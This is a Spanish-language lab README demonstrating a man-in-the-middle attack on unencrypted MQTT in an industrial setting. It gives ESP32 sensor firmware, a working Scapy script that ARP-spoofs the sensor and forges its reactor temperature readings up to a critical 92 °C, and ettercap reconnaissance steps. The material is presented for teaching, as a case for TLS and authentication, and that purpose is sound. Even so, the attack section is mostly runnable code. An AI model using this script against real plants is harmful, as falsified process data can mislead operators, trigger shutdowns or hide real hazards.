# MAN-IN-THE-MOSQUITTO

Este es un laboratorio práctico de ciberseguridad industrial cuyo objetivo principal es demostrar, de forma muy visual y realista, por qué MQTT sin seguridad es extremadamente vulnerable en entornos IoT/OT, y cómo un atacante puede convertirse en Man-in-the-Middle (MitM) para leer, modificar o bloquear datos críticos en tiempo real.

```
@%%%%#%%%%%%%#%#****#####*##@%%%%#%%%%%%%#%#****#####*###+**#***+++****+=+**=+++++**+********##****#**######%##%%*%%%%%%%@@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##%#%%%%#%#%####%#*#*+*#****#*=+=+*+=+***++@%*+==++-*=+*=++*+*+**+*=***+***#*#####%%+##*%##%%%%%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###+*#%%%#%#####+#*==********+-+=-++++=+===+=@@@#@+++:=++==:+++=+++=+**+**+*+++***##%#**#%#%%##%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##=+%++#####*#+***=*=+++*++*+++=====%#+-==+##*%+@%#@+=%=*-@#@===+-++*+*+=*==:=*+#**#+*##*+=#%#%%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*####+#+*%%####=*-*+=+*==+%%%++--=#**+##@+-=+#=#@%+++%+=*+==-*==+=:+=++====-=-=*#+*####=-##+=#*##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*%+#+==%%**+**+--*+=-=++++-+=-=--==+=+--@%=-+%+-+:::==---:=+@@#%%%#++=---=:*=+*+***=*=#*=%%*%%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###===#++#****++=-+---+*#%%*=-+@*=--:::*#%**++=+=:@%#::--:-=#%+%%@*===-+:=--=--+=***==+*=#===+##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###%=-+#*++*****===-==+--+=+-*--+-----=-:#@:=+--==%=-#==%@%==-=@@+==%#@==+-+@%=-=+=*++=-+#=*#+##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=+-=+***+***==-=-=:@@#++%@+-@%@+:%-%@@@@*-:---==:---=-:-+--=+##*=--+-=====--+++*++***-*=*#*##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*####=**=*+***+*=++====++====+---=---:=%=-=+:=@%#:-+*---%=::=-#%--*--++#-====-===+++=**=+*+**####@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*####=**+**+*+++++==+#=#=====*#=--+:-:=:=+:-*%+##@%#:=#*%=::--%@%-----++*=+-=====+++++++**++***##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###+*=****=*+++-==+@@%@@%@@=%%@-+:--%-::+#%:@:::%-:-++=%#%%-:::--+@---%=-=+-==-==+++=++-+==****#@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###-******++++=**%=++@@@#=+@@@#%:::::-:@+*=*:::-=:.::=@+-::=::-*--+#--=%:====-=-@*++=+=-++=+****@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+-+=+*-=++++=--==:--===-+##%%=:=::::%#::::=:::-#%::-=-:-:::#%=:+@@%:--=@*-==-=*@=+=-=+-++=*+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*=-:*=*+-+++%+-=--:-=-%@--::-+:-:#=:::::::::::*=:::::--@#:::::-::%@**:-=@%@--=-======+----==**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##-++===*=====#%=:=:--::+=:-::#*+*-:%*:::.::.*@@@@@=:::::==@-:=@-:=-:=::-%::.:-:-==#=--+*+=:+=**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=*+==*-*++====--::.:#@@:=:=:-:..:.:..:::.:@@@@@@@@.:.::@%:::=@@%+#:=%@:-:-:---=+=#%*::+-*=***@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*==+-*%@*+%+=-=+:*-::%%==*-:=:::::-:...::..@@@@@@@@.:..=:.:+-:+-:-::-::=:::---=%=+*-=-+--+*+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*+++*+@%====@====*::#-@*=-%::#-:#+:.......@@@@@@@@@....=+-...::::=:#::+#::==@==-===-====++**+*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*++++++===+==-@=-=-----:*=:::::::.........-@@@@@@@@....::..:.:.:::=@::-::=@-=--=-==+++-==++***@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##**+-++===%==-=#=--:*=:+:=::%@:.#=:..........@@@@@@............---.:-:*::+-#:--+----=+%*+-==+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##-**-+==+@*====@=*:%#:+:::*@#=#+:::..........@@@@@@.........:...-::=*:+#::::+-:=#-==*@%#:==*++*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##++*--:=+-*===-:+:-::#=*-:+-:%::...........+@@@@@@@@*.........:.-=-.%%:::%-+--:----=+%*@@--+=++@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+=----@@%==-=-+=#@:*-:::=:%.:.:........@@@@@@@@@@@@@@@@-.....:%..:=@#::*--%#%*+--+*%==+%-++*+*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*+++-@@%*+=:==-:@@=+*+::+:..:.......@@@@@@@@@@@@@@@@@@@@@@....:-:.-@@::::=+:+*---=--+--:-=+*++@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+=-+@@+@+=+#=--:#%%:@=:@-:::-:.....@@@@@@@@@@@@@@@@@@@@@@@=.....=::+:-:::-*-+-=@---*====-=+++*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+****++#=*==@*-:%=-=%%:%--.#.:.....@@@@@@@@@@@@@@@@@@@@@@@@...:.:**-:#:--=:---:+======++++++*+@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+++++==++=+==%-=--=+:::::-::::+::..@@@@@@@@@@@@@@@@@@@@@@@@.=.:.---::+--*%:+-=--=+=@===+***++*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##=+==--==#====-:-:%@=:-%%@=:=--:*:-@@@@@@@@@@@@@@@@@@@@@@@@@@..:+:++::##=:-=-%%-+=@@:=-=*++++**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##--=+-==+@@*----=-:-*.-=:@@@=-:..#+@@@@@@@@@@@@@@@@@@@@@@@@@-.:..:::@+.=:-::+*@*==@@-==-=+-*=+*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##=+-+++-*%%=+-=%+=:-@+-%=-:.-+...+:@@@@-@@@@@@@@@@@@@@@@@@@@**.+::::-%::-=:-=@#@-+=+-=--:=-+=++@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+==-=@#*+===-----::@@@#:-::::::-::@@@@.@@@@@@@@@@@@@@@@.@@@@*:@-%##:-*%@=:-:-#=-=+===+:+*==-**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##****+@+++=+=+==-#---=#%-==-:+*:::@@@@@=@@@@@@@@@@@@@@@@.@@@@=:-:-+:-:@@@--:-=*#+==+**+-*+**+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+#*+++++++++=+=%=#==-*@-#::#*::::@@@@@#@@@@@@@@@@@@@@@@+@@@@::-==:-*%+--#-+--=@=+=*@#+=++****+@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=+==+**+++*@+=-=*:-%#**+::::=--:@@@@:@@@@@@@@@@@@@@@@@%+@@@=:*@=-:-:@*++-:-#*%=+*=%==+=++=**#@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=++-*-++=++@@#%*==--@@#*+:=:=+%-@@@@-@@@@@@@@@@@@@@@@@@:@@@+++#::::**@@*-:-=#=++=*+-=***+*+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##-+#-*--*+++==@@%@--=++:-=@%-==-:.@@@**@@@@@@@@@@@@@@@@@*:%@@@@@*=+=:*@@%@%-:-==+*%@++-===+=+=*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*=+++#-*++**+%@@::@*--+==--:==-::@@@::@@@@@@@@@@@@@@@@@@+:@@-:*:*:--+@#%@=::-+=+@@+*==--+=+##*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+**==++*++*++-@*--=:*+-*#--*-----@@:-@@@@@@@@@@@@@@@@@@@=:@@#@#*-%--*+*@@=#-+%-*+@+==-=*=**##+@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###+==#=*#**+*=+=-=:%-#=*=---=-#*-@@@@+@@@@@@@@@@@@@@@@@@@-@@@---+==@-==--@-=-=-+++*+*=-*+=+##+#@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+**#*####*+*+**+-+%@#=*==++=*-*--@@@%@@@@@@@@@@@@@@@@@@@@@@@----=--===-=+=+=+=*+******=#+####%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*#######*##*#*****+==+@++=++*@=@%+*-@@*@@@@@@@@@@@@@@@@@@@@@-@@-=@@%#-=+*====++++*+*********####%@%%%%#%%%%%%%#%#****#####*##
```

## Conceptos generales:

MQTT es un protocolo de mensajería ligero y basado en el patrón de publicación/suscripción diseñado para la comunicación máquina a máquina (M2M) en el Internet de las cosas (IoT).

Su comunicacion es sencilla:

1. El ESP32 se conecta al broker diciendole: `Me suscribo al topico X y voy a publicar en el topico planta/reactor1/temperatura`.
2. Cada que se mide la temperatura, publica (PUBLISH) un mensaje con el valor de la temperatura: `{"temp": 36.8, "tag": "PT100-TX1", "unit": "C"}`
3. El broker recibe el mensaje y reenvia a todos los que esten suscriptos a ese topico.

---

## Diagrama a alto nivel:

- `ESP32 insecure ↔ Broker:1883 (allow_anonymous)`  
    Para demostrar mensajes en texto plano que cualquiera puede interceptar.
- `ESP32 secure ↔ Broker:8883 (TLS + auth + ACL)`  
    Para ver flujo cifrado y controlado por credenciales/ACL.
- `Ettercap` y `Wireshark` escuchando la LAN.  
	Capturar tráfico de ambos escenarios para comparar.

---


## Herramientas:

- Mosquitto Broker: `sudo apt install -y mosquitto mosquitto-clients`, esto instala el broker y los clientes de línea de comandos (mosquitto_pub, mosquitto_sub).
- Wireshark: `sudo apt install -y wireshark tshark`, captura y análisis de paquetes.
- Ettercap: `sudo apt install -y ettercap-common ettercap-graphical`, MITM clásico con interfaz gráfica y textual.
- Libreria en Scapy: `pip3 install scapy`, imprescindible para el script Python del ataque MITM.

## Codigo para el ESP32:

```
#include <WiFi.h>
#include <PubSubClient.h>

// ===========================================================
// SENSOR INDUSTRIAL DE TEMPERATURA - MOD. PT100-TX1
// ===========================================================
const char* ssid = "XXXXXXX"; 
const char* password = "XXXXXXXXXX";
const char* mqtt_server = "XX.XX.XX.XX"; // Broker central de planta

WiFiClient espClient;
PubSubClient client(espClient);

void setup_wifi() {
	Serial.println(F("\nPT100-TX1 | Iniciando Wi-Fi industrial"));
	WiFi.begin(ssid, password);
	while (WiFi.status() != WL_CONNECTED) { delay(500); Serial.print("."); }
	Serial.print(F("\nConectado | IP: "));
	Serial.println(WiFi.localIP());
}

void reconnect() {
	while (!client.connected()) {
	Serial.print(F("Conectando al broker MQTT... "));
	if (client.connect("PT100-TX1-LAB")) {
	Serial.println(F("OK"));
	} else {
	Serial.print(F("fallo rc=")); Serial.println(client.state());
	delay(3000);
		}
	}
}

void setup() {
	Serial.begin(115200);
	delay(1000);
	Serial.println(F("\n========================================"));
	Serial.println(F(" SENSOR PT100-TX1 - PRODUCCIÓN "));
	Serial.println(F(" Temperatura de proceso crítica "));
	Serial.println(F(" Firmware v2.3.1 | 2025 "));
	Serial.println(F(" (c) Industria Química del Sur "));
	Serial.println(F("========================================"));
	setup_wifi();
	client.setServer(mqtt_server, 1883);
}

void loop() {
	if (!client.connected()) reconnect();
	client.loop();
	
	static uint32_t last = 0;
	if (millis() - last > 4000) {
		last = millis();
		float temp = random(220, 402) / 10.0; // 22.0 a 40.1 °C
		
	String payload = "{\"temp\":" + String(temp, 1) + ",\"tag\":\"PT100-TX1\",\"unit\":\"C\"}";
	
	client.publish("planta/reactor1/temperatura", payload.c_str());
	
	Serial.print(F("Enviado → "));
	Serial.print(temp, 1);
	Serial.println(F(" °C"));
	}
}
```

## Codigo en Python:

```
#!/usr/bin/env python3
from scapy.all import *
import random, time, os
from threading import Thread

# ====================================================
# CONFIGURACIÓN
# ====================================================
IFACE       = "XXXX"                    # Interfaz de red del atacante
MY_IP       = "XX.XX.XXX.XX"            # IP propia (también es el broker MQTT)
MY_MAC      = get_if_hwaddr(IFACE)      # MAC propia, obtenida automáticamente
ESP32_IP    = "XX.XX.XX.XX"             # IP del sensor ESP32
ESP32_MAC   = "XX:XX:XX:XX:XX:XX"       # MAC del ESP32 (obtenida con arp-scan/ettercap)
CRITICAL    = 92.0                      # Umbral crítico de temperatura a inyectar
# ====================================================

current_temp = 38.0        # Temperatura inicial desde la que comenzamos a escalar
last_update  = 0           # Control de refresco de pantalla
threshold    = False       # Indica si ya se alcanzó el valor crítico

# ----------------------------------------------------
# ARP spoofing continuo dirigido solo al sensor
# ----------------------------------------------------
def arp_spoof():
    while True:
        # Enviamos ARP reply falso: "MY_IP está en mi MAC"
        send(ARP(op=2, pdst=ESP32_IP, psrc=MY_IP, hwdst=ESP32_MAC), verbose=0)
        time.sleep(1.8)

# ----------------------------------------------------
# Función principal de MITM y manipulación de payload
# ----------------------------------------------------
def mitm(pkt):
    global current_temp, last_update, threshold

    # Solo nos interesan paquetes con payload MQTT
    if not pkt.haslayer(Raw):
        return
    payload = pkt[Raw].load

    # ------------------------------------------------
    # Paquetes PUBLISH del ESP32 hacia el broker (los modificamos)
    # ------------------------------------------------
    if (pkt.haslayer(IP) and pkt[IP].src == ESP32_IP and
        pkt.haslayer(TCP) and pkt[TCP].dport == 1883 and
        b'"temp"' in payload):

        try:
            txt = payload.decode()                                   # Payload en texto
            real_temp = float(txt.split('"temp":')[1].split(',')[0].split('}')[0])

            # Escalada progresiva y realista de la temperatura
            current_temp += round(random.uniform(2.1, 4.3), 1)
            if current_temp >= CRITICAL:
                current_temp = CRITICAL
                threshold = True

            forged_temp = round(current_temp, 1)

            # Sustituimos el valor real por el falso en el JSON
            forged_txt = txt.replace(f'"temp":{real_temp}', f'"temp":{forged_temp}', 1)
            forged_payload = forged_txt.encode()

            # Construcción del paquete falsificado
            spoofed = (Ether(src=MY_MAC, dst=MY_MAC) /
                       IP(src=ESP32_IP, dst=MY_IP) /
                       pkt[TCP] /
                       Raw(forged_payload))

            # Ajuste de secuencia TCP cuando cambia la longitud del payload
            if len(forged_payload) != len(payload):
                spoofed[TCP].seq += len(forged_payload) - len(payload)

            # Envío del paquete modificado
            sendp(spoofed, iface=IFACE, verbose=0)

            # Actualización de pantalla cada ~0.9 s o al alcanzar el objetivo
            if time.time() - last_update > 0.9 or threshold:
                os.system('clear')
                print("\033[90m┌" + "─" * 70 + "┐\033[0m")
                print("│ \033[97;44m MQTT Integrity Assessment – Controlled Environment \033[0m │")
                print("\033[90m└" + "─" * 70 + "┘\033[0m")
                print(f" Sensor         : {ESP32_IP} ({ESP32_MAC})")
                print(f" MQTT Broker    : {MY_IP}:1883")
                print(f" Topic          : planta/reactor1/temperatura")
                print(f" Measured value : {real_temp:6.1f} °C")
                print(f" Reported value : {forged_temp:6.1f} °C")
                filled = int(50 * forged_temp / CRITICAL)
                bar = "█" * filled + "░" * (50 - filled)
                print(f" Progress       : [{bar}] {forged_temp:5.1f} / {CRITICAL} °C")
                last_update = time.time()

        except:
            pass   # Ignoramos cualquier error de parsing

    # ------------------------------------------------
    # Reenvío transparente de respuestas del broker al sensor
    # ------------------------------------------------
    elif pkt.haslayer(IP) and pkt[IP].dst == ESP32_IP and pkt[TCP].sport == 1883:
        sendp(Ether(src=MY_MAC, dst=MY_MAC) / pkt[IP], iface=IFACE, verbose=0)

# ====================================================
# INICIO DEL ATAQUE / DEMOSTRACIÓN
# ====================================================
Thread(target=arp_spoof, daemon=True).start()   # Inicia ARP spoofing en segundo plano
time.sleep(2)                                   # Pequeña espera para estabilizar ARP
sniff(iface=IFACE, prn=mitm, filter="tcp port 1883", store=0)  # Captura y procesa tráfico MQTT
```




### Explicacion del codigo:

1. El sensor ESP32 mide la temperatura cada pocos segundos y se la envía a tu ordenador (el “broker”).
2. El script le miente al sensor diciendo:
“Ey, yo soy tu ordenador, mándame los datos a mí”.
4. Cuando el sensor envía la temperatura real (por ejemplo 30 °C), el script la intercepta antes de que llegue al ordenador.
5. El script cambia ese número por uno más alto (la sube de a poquito cada vez: 35 → 42 → 59 → 78 → 92 °C).
6. Le entrega al ordenador SOLO la temperatura falsa (el ordenador nunca ve la verdadera).
7. En pantalla vas viendo en vivo cómo la temperatura “sube sola” hasta llegar a 92 °C y se pone en rojo diciendo “¡umbral crítico alcanzado!”.


---


## Metodologia del ataque:

1. Fase de reconocimiento y mapeo de la red:
	- Herramientas: `ettercap`, este realizara:
    	- Envío masivo de ARP who-has a todas las direcciones de la subred 10.235.248.0/24
    	- Envío paralelo de ICMP echo-request (ping sweep) para forzar respuestas ARP adicionales
    	- Escucha pasiva de tráfico ARP broadcast existente
    	- Construcción automática de tabla IP ↔ MAC ↔ Fabricante

2. Fase de envenenamiento ARP dirigido (ARP Spoofing):
   - Se engaña al ESP32 haciendole pensar que la IP del broker MQTT ahora tiene nuestra MAC de atacante, y se podran ver los paquetes ya que son redireccionados.
  
3. Fase de intercepcion y modificacion de parametros:
   - Se capturan los paquetes MQTT con `sniff()` de Scapy.
   - Se identifican los paquetes que tiene el formato JSON de los valores de la temperatura.
   - Se cambian los valores progresivamente para que se eleven a 92.0 °C.
   - Se reconstruyen los paquetes con la MAC de origen y MAC de destino, ajustando el numero de secuencia TCP cuando se cambia la longitud del payload e incluyendo los demas campos del paquete.

4. Fase de reenvio transparente:
   - Todos los paquetes del broker hacia el ESP32 se reenvian inmediatamente con la MAC del atacante como origen, esto mantiene la sesion MQTT viva indefinidamente.

## Ataque:

- Iniciar ettercap `sudo ettercap -G`:


<img width="1366" height="768" alt="image" src="https://github.com/user-attachments/assets/b7a66ce6-4492-411f-911c-1b879185304e" />


- Mapeamos las IPs de la red:

  
<img width="1365" height="764" alt="image" src="https://github.com/user-attachments/assets/22fe9420-9001-4323-a8d3-c81e4c6c2055" />


- Mapeo de red (IPs y MACs):
  

<img width="1366" height="768" alt="image" src="https://github.com/user-attachments/assets/f0a3de6b-376d-4087-a9d8-2754f9a1d975" />


- En el apartado `View` -> `Connections` podemos ver los paquetes que se envian:


<img width="1366" height="768" alt="image" src="https://github.com/user-attachments/assets/220c8c8f-ef5c-49a2-8437-9acfe8ab4e6f" />


- Activar el codigo y utilizar `mosquitto_sub` para poder ver como los paquetes le llegan al broker:


<img width="1366" height="768" alt="image" src="https://github.com/user-attachments/assets/27f8d5d8-d798-409b-a526-50d6fd2eefeb" />


---
